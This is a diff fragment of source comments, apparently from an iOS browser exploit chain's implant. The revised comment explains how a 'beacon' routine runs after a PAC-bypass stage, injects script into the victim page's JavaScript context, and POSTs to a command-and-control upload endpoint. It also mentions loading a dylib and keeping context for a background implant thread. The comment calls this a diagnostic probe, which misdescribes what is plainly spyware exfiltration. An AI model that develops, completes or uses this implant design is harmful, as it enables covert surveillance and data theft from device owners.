@@ -25,11 +25,10 @@ extern void upload_beacon(void);
  * 执行顺序：
  *   1. upload_beacon()      — 三通道诊断探针：
  *
- *        Channel C（JSContext 注入）[v1.4 新增，优先级最高]
- *          process() 由 Stage3 PAC-bypass 直接调用，此时仍在 JSC 执行栈上，
- *          vm.topCallFrame 有效，[JSContext currentContext] 返回活跃 JS 上下文。
- *          调用 evaluateScript: 执行同步 XMLHttpRequest POST，与页面拉 dylib
- *          同栈——减轻异步 fetch 在 cleanup 前未完成的竞态。
+ *        Channel C（JSContext / VM TLS 注入）
+ *          process() 在 Stage3 .Pt() 返回栈上执行；+[JSContext currentContext]
+ *          可能为 nil，但 JSGlobalContextGetCurrent 仍常指向页面 VM（与同步 XHR
+ *          GET bootstrap.dylib 同源）。注入脚本对 C2_UPLOAD 做同源相对 POST。
  *          日志中描述含 "(jsc)" → Channel C 成功。
  *          同时保存 JSContext 强引用，供后台 implant 线程 dispatch_async 复用。
  *
